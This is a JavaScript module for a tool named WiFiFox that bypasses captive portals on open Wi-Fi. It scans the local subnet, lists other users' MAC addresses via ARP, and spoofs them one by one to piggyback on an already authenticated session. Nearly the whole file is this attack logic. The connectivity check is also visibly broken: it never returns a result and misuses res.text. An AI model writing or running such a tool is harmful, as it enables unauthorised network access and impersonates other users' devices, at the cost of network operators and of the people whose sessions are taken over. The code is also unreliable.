const defaultGateway = require('default-gateway');
const os = require('os');
const ping = require('./ping');
const arp = require('./arp');
const spoof = require('spoof');
const cidrRange = require('cidr-range');
const wifi = require('node-wifi');
const fetch = require('node-fetch');

const BLOCK_SIZE = 255

async function checkIsConnected() {
  fetch('http://www.apple.com/library/test/success.html')
      .then((res) => res.text)
      .then((body) => body === '<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>')
      .catch((err) => false);
}

let isInit = false
async function init() {
  if (isInit) return;
  const { interface: netInterface } = await defaultGateway.v4() // TODO: v6 support
  if (!netInterface) return;
  wifi.init({
    iface: netInterface
  })
  isInit = true;
}

module.exports.isOnOpenNetwork = async () => {
  await init();

  const currentConnections = await new Promise((resolve, reject) => {
    wifi.getCurrentConnections(function (err, currentConnections) {
      if (err) return reject(err)
      resolve(currentConnections)
    })
  });

  if (currentConnections.length === 0) {
    return false;
  }

  return isOpenSecurity(currentConnections[0].security);
}

function isOpenSecurity(security) {
  // TODO: maybe not "none" for all OS?
  const openStates = [
    'open',
    'none',
  ];

  return openStates.indexOf(security.toLowerCase()) !== -1;
}

function isMulticastAddress(mac) {
  return parseInt(mac.split(':')[0], 16) & 1; // 1 in LSB of first octect implies multicast
}

function isBroadcastAddress(mac) {
  return mac === 'FF:FF:FF:FF:FF:FF';
}

module.exports.listValidMacs = async () => {
  const { gateway, interface: netInterface } = await defaultGateway.v4(); // TODO: v6 support
  const iface = os.networkInterfaces()[netInterface].filter(i => i.family === 'IPv4')[0];
  return (await arp.listMACs(gateway, iface.address))
    .filter(mac => mac !== iface.mac)
    .filter(mac => !isMulticastAddress(mac))
    .filter(mac => !isBroadcastAddress(mac))
}

async function pingScan(netInterface, blockCallback) {
  // get interface object
  const iface = os.networkInterfaces()[netInterface].filter(i => i.family === 'IPv4')[0]

  // get all IPs in CIDR range of gateway
  const range = cidrRange(iface.cidr, { onlyHosts: true })

  // ping scan a block of IPs
  let i = 0
  while (i < range.length) {
    const isConnected = await blockCallback()
    if (isConnected) return true

    const block = range.slice(i, i + BLOCK_SIZE)
    console.log('Scanning next block of', BLOCK_SIZE)
    await Promise.all(block.map((ip) => {
      return ping(ip)
    }))
    i += BLOCK_SIZE
  }

  console.log('Scan complete.')
  return false
}

module.exports.manualScan = async () => {
  const { interface: netInterface } = await defaultGateway.v4() // TODO: v6 support
  await pingScan(netInterface, async () => { return false })
}

async function tryMACs(attemptedMACs, initialSSID, it) {
  const newMACs = (await exports.listValidMacs())
    .filter(mac => attemptedMACs.indexOf(mac) === -1)
  for (let j = 0; j < newMACs.length; ++j) {

    // spoof MAC
    console.log('Trying MAC', newMACs[j]);
    spoof.setInterfaceMAC(it.device, newMACs[j], it.port);
    attemptedMACs.push(newMACs[j]);

    // force wifi reconnect
    await new Promise((resolve, reject) => {
      wifi.connect({ ssid: initialSSID }, (err) => {
        if (err) {
          reject(err);
        }
        
        resolve()
      })
    });

    if (await checkIsConnected()) {
      console.log('Connected with MAC', newMACs[j])
      return true;
    }
  }
  console.log('Done trying block of MACs')
  return false
}

module.exports.connect = async (silentMode) => {
  await init();

  if (await checkIsConnected()) {
    return; // try our initial MAC
  }

  // get default gateway, interface name
  const { interface: netInterface } = await defaultGateway.v4() // TODO: v6 support
  const it = spoof.findInterface(netInterface)

  const currentConnections = await new Promise((resolve, reject) => {
    wifi.getCurrentConnections(function (err, currentConnections) {
      if (err) {
        return reject(err);
      }

      resolve(currentConnections);
    })
  })

  if (currentConnections.length === 0) {
    console.log('Not connected to any network');
    throw new Error('Not connected to any network.');
  }

  console.log('Network security', currentConnections[0].security)
  if (!isOpenSecurity(currentConnections[0].security)) {
    console.log(currentConnections[0].ssid, 'is not an open network.');
    throw new Error('WiFiFox only works with open networks.');
  }

  const initialSSID = currentConnections[0].ssid;
  const iface = os.networkInterfaces()[netInterface].filter(i => i.family === 'IPv4')[0];
  const attemptedMACs = [iface.mac];

  let isConnected = false;
  if (silentMode) {
    isConnected = await tryMACs(attemptedMACs, initialSSID, it);
  } else {
    isConnected = await pingScan(netInterface, async () => {
      return await tryMACs(attemptedMACs, initialSSID, it);
    });
  }

  if (isConnected) {
    return;
  }

  console.log('Failed to connect with any MAC');
  if (attemptedMACs.length > 1) {
    throw new Error("WiFiFox couldn't bypass the captive portal.");
  } else {
    throw new Error('No other users are on this network.');
  }
}

module.exports.reset = async () => {
  // get default gateway, interface name
  const { interface: netInterface } = await defaultGateway.v4(); // TODO: v6 support
  const it = spoof.findInterface(netInterface);

  spoof.setInterfaceMAC(it.device, it.address, it.port);
}
